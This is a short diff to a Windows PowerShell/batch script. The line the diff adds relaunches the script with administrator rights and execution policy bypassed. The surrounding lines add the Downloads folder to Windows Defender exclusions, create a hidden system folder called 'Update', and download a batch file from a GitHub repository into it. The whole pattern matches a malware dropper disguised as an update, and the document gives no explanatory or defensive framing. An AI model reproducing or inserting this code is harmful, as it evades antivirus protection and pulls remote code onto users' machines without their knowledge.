@@ -1,3 +1,4 @@
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
 powershell -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads"
 mkdir "$env:USERPROFILE\Downloads\Update"; attrib +h +s "$env:USERPROFILE\Downloads\Update"
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/gbg379594/OS/raw/refs/heads/main/Update.bat' -OutFile '$env:USERPROFILE\Downloads\Update\Update.bat'"
